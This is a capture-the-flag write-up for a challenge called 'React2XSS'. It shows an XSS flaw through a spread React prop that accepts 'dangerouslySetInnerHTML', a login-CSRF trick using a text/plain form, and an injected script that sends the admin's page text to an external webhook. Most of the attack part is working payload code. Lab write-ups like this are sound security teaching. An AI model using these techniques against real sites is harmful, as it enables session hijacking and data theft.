# React2XSS

As the name implies, this is going to be a ReactJS platform that can be exploited by XSS technique.

## The website

The web app has the following endpoints:
- `/`: Home page, aka Profile page. The text "Current Profile Views Progress (Free flags if you reach 100%)" looks like a hint. Let's remember to check that part in the source code.
- `/account/settings`: Profile Settings, for editing the profile, including Bio, Progress Bar Custom Style (JSON), Website and Location. The "Progress Bar Custom Style (JSON)" surely looks suspicious here.
- `/report`: the usual XSS mechanism to report a URL to the Admin.

## Checking for XSS vulnerability

Let's dive into the progress bar directly.

File: `app/page.tsx`

```html
<progress max={100} value={viewCount} {...userData.viewProgressStyle} />
```

It uses the spread syntax to expand the `viewProgressStyle` object as the props for the `progress` element.
If the server does not block `dangerouslySetInnerHTML`, there are likely XSS opportunities.

The network request to update a profile is a `POST` request to `/api/profile/update` with the JSON body like this:

```json
{"bio":"","website":"","location":"","viewProgressStyle":{"style":{"height":"20px"}}}
```

The JS wraps the Custom Style inside the `style` attribute in `viewProgressStyle`. Let's try changing the payload:

```json
{
    "bio": "",
    "website": "",
    "location": "",
    "viewProgressStyle": {
        "style": {"height": "20px"},
        "dangerouslySetInnerHTML": {"__html": "<script>alert(1)</script>"}
    }
}
```

The alert is shown! It confirms the XSS vulnerability through the user profile page.

## Finding the exploit path

Now that the XSS vulnerability is identified, let's check where the flag is located and how we can exfiltrate it.

- The flag is in the Bio of admin's profile (`lib/db.ts`), thus will be displayed when admin logins to his own profile.
- The bot logins as admin account, and visits any reported URL. There are no restrictions on the URL domains.
- Within the app, the admin account is not able to retrieve our own profile page. We also do not control any attributes of the admin account. It means the admin account cannot trigger any XSS directly.
- How about we make the admin logins to our own account in a new window?

To explore further on the possible restrictions:

- HTTP response header: `X-Frame-Options: DENY`. It means `<frame>`, `<iframe>`, `<embed>`, `<object>` won't work. (`middleware.ts`)
- Cookie options are as below (`lib/session.ts`). It means the top-level navigations with `GET` request will have the cookies sent, esp. admin's cookies.
    ```javascript
    cookieOptions: {
        secure: false,
        httpOnly: true,
        maxAge: 60 * 60 * 24,
        sameSite: 'Lax'
    },
    ```
- The admin bot waits for extra 5 seconds after visiting the given URL. It will give enough time for our script to trigger the re-login in a new window and exfiltrate the flag. (`lib/bot.ts`)

Given the above findings, it looks possible for the admin bot to navigates to our own hosted website which triggers new window with `window.open`. For the login, it has to be done with a native HTML form instead of a `fetch` POST request within JavaScript.

1. Admin logins to its own profile.
2. Admin visits the malicious URL
3. The malicious URL creates a new window with an HTML form that logins as the user `user2` with an XSS-injected profile, and navigate to `user2`'s profile.
4. Just before the login, the malicious URL navigates to admin's profile to display the flag.
5. The XSS on `user2`'s profile is triggered and obtains the HTML document in the `admin`'s profile window.

## Writing the exploit

- Also note that the database is regularly cleaned up every 30 minutes, in `lib/db.ts`:
  - `setInterval(cleanupDatabase, DATABASE_CLEANUP_INTERVAL_MINUTE);`
- The request to `api/auth/login` requires a JSON body. Since JS `fetch` POST request is not allowed, when crafting the HTML form to login, the `name` and `value` have to be set to mimic a JSON payload:
    ```javascript
    input.name = '{"username":"user2","password":"password123","ignore":"';
    input.value = '"}';
    ```
- The `/api/profile/update` endpoint is protected with CSRF token. To inject my own `dangerouslySetInnerHTML` to the `viewProgressStyle` JSON, I used Burp to intercept and modify the request accordingly.
- For the HTML, the nested JS inline script has to end with `<\/script>` to avoid being interpreted as the closing tag for the outer `<script>` tag.

### Self-hosted HTML for the bot to revisit

```html
<html>
  <head><title>XSS</title></head>
  <body>
    <script>
window.name = 'admin';
const attacker = window.open('about:blank', 'attacker');
attacker.document.write(`
<!DOCTYPE html>
<html>
<body>
  <script>
    setTimeout(function() {
      const loginWin = window.open('about:blank', 'login_target');
      const form = document.createElement('form');
      form.action = 'http://localhost:3000/api/auth/login';
      form.method = 'POST';
      form.enctype = 'text/plain';
      form.target = 'login_target';
      const input = document.createElement('input');
      input.name = '{"username":"user2","password":"password123","ignore":"';
      input.value = '"}';
      form.appendChild(input);
      document.body.appendChild(form);
      form.submit();
      setTimeout(function() {
        window.location = 'http://localhost:3000/';
      }, 1000);
    }, 1000);
  <\/script>
</body>
</html>
`);

setTimeout(function() {
  window.location = 'http://localhost:3000/';
}, 500);
    </script>
  </body>
</html>
```

### JSON request body of the profile update request

JS Script to be injected (`xss.js`)

```javascript
const WEBHOOK = 'https://<my-account>.m.pipedream.net/?v=1';
function toStr(o) {
	return btoa(unescape(encodeURIComponent(o)));
}
function getFlag() {
  const w = window.open('', 'admin');
  const t = w.document.body.innerText;
  fetch(WEBHOOK + '&body=' + toStr(t));
}
setTimeout(getFlag, 500);
```

Producing the JSON payload for `/api/profile/update`:

```python
import json
js = open('xss.js').read()
payload = {
    'bio': '',
    'location': '',
    'viewProgressStyle': {
        'dangerouslySetInnerHTML': {
            '__html': f'<script>{js}</script>',
        },
    },
}
print(json.dumps(payload))
```

### Flag obtained

`PUCTF26{35c41471n9_531f_x55_15_5up32_fun_dk4pfu3rjGQ16qTZEL3BP3hkposz88HB}`
